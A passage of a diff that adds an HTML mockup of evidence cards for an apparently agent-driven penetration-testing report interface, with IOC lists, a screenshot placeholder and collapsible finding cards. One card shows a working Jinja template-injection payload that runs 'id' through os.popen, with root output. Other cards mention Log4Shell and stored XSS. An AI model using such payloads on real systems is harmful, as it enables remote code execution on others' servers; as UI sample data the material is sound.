+            <div class="ev-code"><span class="line"><span class="tk-err">{{</span> <span class="tk-var">request</span>.application.<span class="tk-fn">__globals__</span>.<span class="tk-fn">__builtins__</span>.<span class="tk-fn">__import__</span><span class="tk-punct">(</span><span class="tk-str">'os'</span><span class="tk-punct">).</span><span class="tk-fn">popen</span><span class="tk-punct">(</span><span class="tk-str">'id'</span><span class="tk-punct">).</span><span class="tk-fn">read</span><span class="tk-punct">()</span> <span class="tk-err">}}</span></span><span class="line"><span class="tk-comment">// decodes to:</span></span><span class="line"><span class="tk-str">uid=0(root) gid=0(root) groups=0(root)</span></span></div>
+          </div>
+        </div>
+        <div class="ev-foot">
+          <span>cwe · <span class="hash">CWE-1336</span></span>
+          <span class="spacer"></span>
+          <span>agent exploit</span>
+        </div>
+      </div>
+
+      <div class="ev" data-kind="ioc">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>IOCs</span>
+          <span class="title">Indicators extracted from session</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          </div>
+        </div>
+        <div class="ev-body">
+          <div class="ev-ioc-grid">
+            <div class="type">IP</div><div class="val">10.20.30.12</div><div class="src">nmap</div>
+            <div class="type">Domain</div><div class="val">attacker.bjhunt.local</div><div class="src">payload</div>
+            <div class="type">Hash</div><div class="val">7f4a9c2e8b1d5f3a0e7c9b2d4f6a8e1c</div><div class="src">file</div>
+            <div class="type">CVE</div><div class="val">CVE-2021-44228</div><div class="src">match</div>
+            <div class="type">Port</div><div class="val">tcp/8080</div><div class="src">nmap</div>
+            <div class="type">User</div><div class="val">svc-audit@internal.local</div><div class="src">kerberoast</div>
+          </div>
+        </div>
+        <div class="ev-foot">
+          <span>count · <span class="hash">6 indicators</span></span>
+          <span class="spacer"></span>
+          <span>agent analyst</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 08. Screenshot ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">07</span><h2>Screenshot · visual evidence</h2><span class="meta">kind=screenshot · placeholder</span></div>
+    <div class="ev" data-kind="screenshot">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Screenshot</span>
+        <span class="title">Admin panel · XSS popup triggered</span>
+        <div class="meta">
+          <span><b>1920×1080</b></span>
+          <span><b>png</b> 142kb</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act">Open</button>
+        </div>
+      </div>
+      <div class="ev-screenshot">
+        <div class="ev-screenshot-placeholder">
+          <div class="ev-screenshot-frame">
+            <div class="ev-screenshot-frame-chrome">
+              <i></i><i></i><i></i>
+              <span class="url">https://target.example.com/admin/audit</span>
+            </div>
+            <div class="ev-screenshot-frame-body">
+              <div class="alert">⚠  XSS · alert('pwned') · stored</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>sha256 · <span class="hash">c9e2a4f7...b3</span></span>
+        <span class="spacer"></span>
+        <span>captured · 14:51:44 UTC · agent analyst</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 08. Collapsed ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">08</span><h2>Collapsed state · hidden body</h2><span class="meta">Dense FindingCard context</span></div>
+    <div style="display: flex; flex-direction: column; gap: 8px;">
+      <div class="ev" data-kind="request" data-collapsed="true">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>Request</span>
+          <span class="title">POST /api/search · 847 bytes · Log4Shell payload</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="toggleCollapse(this)">Expand</button>
+          </div>
+        </div>
+      </div>
+      <div class="ev" data-kind="response" data-collapsed="true">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>Response</span>
+          <span class="title">500 Internal Server Error · 1.2k · SQL error trace</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="toggleCollapse(this)">Expand</button>
+          </div>
+        </div>
+      </div>
+      <div class="ev" data-kind="code" data-collapsed="true">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>Code</span>
+          <span class="title">audit_controller.js · line 23 · vulnerable handler</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="toggleCollapse(this)">Expand</button>
+          </div>
+        </div>
+      </div>
+      <div class="ev" data-kind="diff" data-collapsed="true">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>Diff</span>
+          <span class="title">audit_controller.js · +4 −2 · patch verified</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="toggleCollapse(this)">Expand</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="tweaks" id="tweaks">
+  <h3>Tweaks</h3>
+  <label>Show gutter line numbers <input type="checkbox" class="tw-switch" id="tw-gutter" checked></label>
+  <label>Highlight critical lines <input type="checkbox" class="tw-switch" id="tw-highlight" checked></label>
+</div>
+
+<script>
+/*EDITMODE-BEGIN*/
+const TWEAK_DEFAULTS = {
+  "gutter": true,
+  "highlight": true
+}
+/*EDITMODE-END*/
+
+function copyBlock(btn) {
+  const block = btn.closest('.ev');
+  const body = block.querySelector('.ev-code');
+  if (!body) return;
+  const text = body.innerText;
+  navigator.clipboard?.writeText(text).catch(() => {});
+  const orig = btn.textContent;
+  btn.classList.add('copied');
+  btn.textContent = 'Copied';
+  setTimeout(() => { btn.classList.remove('copied'); btn.textContent = orig; }, 1200);
+}
+function toggleCollapse(btn) {
+  const block = btn.closest('.ev');
+  const isCollapsed = block.getAttribute('data-collapsed') === 'true';
+  block.setAttribute('data-collapsed', isCollapsed ? 'false' : 'true');
+  btn.textContent = isCollapsed ? 'Collapse' : 'Expand';
+}
+
+window.addEventListener('message', (e) => {
+  if (!e.data || typeof e.data !== 'object') return;
+  if (e.data.type === '__activate_edit_mode') document.getElementById('tweaks').classList.add('open');
+  if (e.data.type === '__deactivate_edit_mode') document.getElementById('tweaks').classList.remove('open');
+});
+window.parent.postMessage({ type: '__edit_mode_available' }, '*');
+
+document.getElementById('tw-gutter').checked = TWEAK_DEFAULTS.gutter;
+document.getElementById('tw-highlight').checked = TWEAK_DEFAULTS.highlight;
+document.getElementById('tw-gutter').addEventListener('change', (e) => {
+  document.querySelectorAll('.ev-gutter').forEach(g => g.style.display = e.target.checked ? '' : 'none');
+});
+document.getElementById('tw-highlight').addEventListener('change', (e) => {
+  document.querySelectorAll('.ev-code .line.highlight, .ev-gutter .ln.highlight').forEach(l => {
+    if (!e.target.checked) {
+      l.dataset.origClass = l.className;
+      l.className = l.className.replace('highlight', '');
+    } else if (l.dataset.origClass) {
+      l.className = l.dataset.origClass;
+    }
+  });
+});
+</script>
+</body>
+</html>
